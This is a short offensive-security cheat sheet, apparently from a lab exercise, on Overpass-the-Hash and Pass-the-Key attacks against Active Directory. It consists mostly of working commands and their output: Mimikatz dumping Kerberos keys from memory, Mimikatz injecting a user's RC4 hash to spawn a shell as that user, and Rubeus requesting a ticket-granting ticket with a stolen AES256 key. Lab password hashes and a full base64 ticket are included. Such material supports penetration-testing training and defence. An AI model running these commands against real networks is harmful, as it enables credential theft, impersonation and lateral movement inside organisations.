# Overpass-the-Hash

## Jargon

| NAME | ALGORITHM |
|---|---|
| [Overpass-the-Hash](https://www.slideshare.net/slideshow/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/37957800) | RC4 |
| [Pass-the-Key](https://www.slideshare.net/slideshow/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it/37957800) | DES AES-128 AES-256 |

## Listing Kerberos Encryption Keys

```pwsh
PS C:\Users\Administrator> C:\Tools\mimikatz.exe privilege::debug sekurlsa::ekeys exit
```

```output title="Output" hl_lines="13-18 32-37 51-56"
Authentication Id : 0 ; 374366 (00000000:0005b65e)
Session           : Service from 0
User Name         : david
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 12/11/2024 4:44:09 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1107

         * Username : david
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
         * Key List :
           aes256_hmac       bdd5cd6494b7ea41f3b987736ec491493d5cf460986809b8341733cfdca5141a
           rc4_hmac_nt       c39f2beb3d2ec06a62cb887fb391dee0
           rc4_hmac_old      c39f2beb3d2ec06a62cb887fb391dee0
           rc4_md4           c39f2beb3d2ec06a62cb887fb391dee0
           rc4_hmac_nt_exp   c39f2beb3d2ec06a62cb887fb391dee0
           rc4_hmac_old_exp  c39f2beb3d2ec06a62cb887fb391dee0

Authentication Id : 0 ; 369392 (00000000:0005a2f0)
Session           : Service from 0
User Name         : julio
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 12/11/2024 4:44:08 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1106

         * Username : julio
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
         * Key List :
           aes256_hmac       77da7057b42509a1d086f4f58e7252ad673b1940be2f741c496c577d10e4df76
           rc4_hmac_nt       64f12cddaa88057e06a81b54e73b949b
           rc4_hmac_old      64f12cddaa88057e06a81b54e73b949b
           rc4_md4           64f12cddaa88057e06a81b54e73b949b
           rc4_hmac_nt_exp   64f12cddaa88057e06a81b54e73b949b
           rc4_hmac_old_exp  64f12cddaa88057e06a81b54e73b949b

Authentication Id : 0 ; 372010 (00000000:0005ad2a)
Session           : Service from 0
User Name         : john
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 12/11/2024 4:44:08 AM
SID               : S-1-5-21-3325992272-2815718403-617452758-1108

         * Username : john
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
         * Key List :
           aes256_hmac       9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc
           rc4_hmac_nt       c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_hmac_old      c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_md4           c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_hmac_nt_exp   c4b0e1b10c7ce2c4723b4e2407ef81a2
           rc4_hmac_old_exp  c4b0e1b10c7ce2c4723b4e2407ef81a2
```

## Performing the Attack

### Mimikatz

```pwsh
PS C:\Users\Administrator> C:\Tools\mimikatz.exe privilege::debug "sekurlsa::pth /user:john /domain:INLANEFREIGHT.HTB /rc4:C4B0E1B10C7CE2C4723B4E2407EF81A2 /run:cmd.exe" exit
```

```output title="Output" hl_lines="11"
user    : john
domain  : INLANEFREIGHT.HTB
program : cmd.exe
impers. : no
NTLM    : c4b0e1b10c7ce2c4723b4e2407ef81a2
  |  PID  5212
  |  TID  5468
  |  LSA Process is now R/W
  |  LUID 0 ; 1844538 (00000000:001c253a)
  \_ msv1_0   - data copy @ 0000025C1290C220 : OK !
  \_ kerberos - data copy @ 0000025C132635E8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000025C131FACF8 (32) -> null
```

### Rubeus

!!! success

    Kerberos anahtarı kullanılarak TGT talep edilir.

```pwsh
PS C:\Users\Administrator> C:\Tools\Rubeus.exe asktgt /user:john /domain:INLANEFREIGHT.HTB /aes256:9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC /nowrap
```

```output title="Output" hl_lines="9"
[*] Action: Ask TGT

[*] Using aes256_cts_hmac_sha1 hash: 9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC
[*] Building AS-REQ (w/ preauth) for: 'INLANEFREIGHT.HTB\john'
[*] Using domain controller: 172.16.1.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6sp14JDWVjffpN3vQgxcOCH7cKo9BbVKKBIJxcxyq9o276KG65I4E8GdqAtBpRR9EcCg4QH9G65vV4y/EF+8leUE+VePz7hJXfQR5/kgUVFaIml3nUOPn05gyGvhTpqie2TUGP49at6TJ6cML4obArvYb9JIRB4h8LMW0tomxPZutqc4N+tqsM96Wf9AcwOV7dz7GnjxTZBkE7xcib2M585iup6wn6LDWUypYr4u+dTYtSxwzherkm0Lz0X+wk2nf3APOl+Yfxdo0vbIniXd/smvQp7ul2pA+l+1B7/Q6DP98b/SSmxo8ohWwQXr3Wxp08SPHwuEnPIgAurQNlCOoHxSjOPykFwEfFP5bV1/oxeQ9dH5c9LNbCRaalEHAoS2XixvlOCsXj7916TNHnMBNVGmMejMCAzJyK/NtMYL8O8rNDKXVI7tQ44t1C1oHUDfrkaB6UEM4JmfgPi1qOwCo/Tis61LNyTz4HsPup3BoBwE1a3K4CDExQpsglS+LK9u7/4aCRqlUXKAhIuFaudNvaF0v9XL0Hq5iWGBtWLV2scZJ2WSwREyWFTH2NYed1hoSsrkoZyP4SunK1aD9zKO6WkIIoF6ptU7l+8twdZmQiF9ollkNAmBddxnjRLXEpFIJeTKkHIaZnd+pL6KtKvWoNA8R8op3ldYXLezReOWNCkfRxN37zDpfJoybGLOjZLHTwEuTho4iRrHiCIXZx2kx/rjCoT0nGP4udJzHSHjuidzhP7L4rFNWmnsAD5Bv6nJS7NYIjvgR5iXPWkbcNIaWtFiQhTybXAZODsybn1Bf0M6Vt68aY0qOFWRUIojKkYlG+gS5b3m++sTMnbVvScbpRc/m/mj9P/7Je4GXm+4KgCT0exliXE1UN9LszeF3NjHqHUuFo+R/DEEd3ehP2ntcfHfGnSpGTAt5l9Wij8OYmkSxtRHlr8BELT7XRVKEzIz62FVvFMNMNf4UzzlUO7jYGk6eglMi6TrsODANHc6YqeRtvb6LEuxKpPYEn02P7H2DEgai8u+sGvwT/wzBD4eBwMpoYocxs4yer/s+WSezHoFksTkI0Wryqtd2YwNuBVazZUeHx4nJ3S+6Oaz6ofZAxKyKaNTQxnT8GbPo0tALbPRPX4hpS+ASrQfbZm6f7Pot65Z7yo/1lS0qwFBbNKQxhyiQHD6JoKyryje1pV9zy1/d3W3Jruraf7jmoQM7Ubc+IZOiqcEiFnR5elddjak821W5LlMbDFQPfTUd2P4rBlXxzJz46ChaEi74tROV/zK/r5KQ2j2lppbMvYB0brmC4mdWLieh1puHyahI2N0kdCevRWK9tZX9V3Pd2pvyLYuf3ck1mpVuNtbrV8/fZeXU4grPAOlr+dez2WtL6G3jjuNQyZIrHt9hTGhEsLPPYPP0Ce59jA1YSZLaz9MyEHnhG6YFSRg3lw3hkaOjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCBwBchdbRG/GakkfzpD+BkDgCR6nrhWiXQ7NcZPpXNmE6ETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNDEyMTExNzU5MDlaphEYDzIwMjQxMjEyMDM1OTA5WqcRGA8yMDI0MTIxODE3NTkwOVqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC

  ServiceName              :  krbtgt/INLANEFREIGHT.HTB
  ServiceRealm             :  INLANEFREIGHT.HTB
  UserName                 :  john
  UserRealm                :  INLANEFREIGHT.HTB
  StartTime                :  12/11/2024 11:59:09 AM
  EndTime                  :  12/11/2024 9:59:09 PM
  RenewTill                :  12/18/2024 11:59:09 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  cAXIXW0RvxmpJH86Q/gZA4Akep64Vol0OzXGT6VzZhM=
  ASREP (key)              :  9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC
```
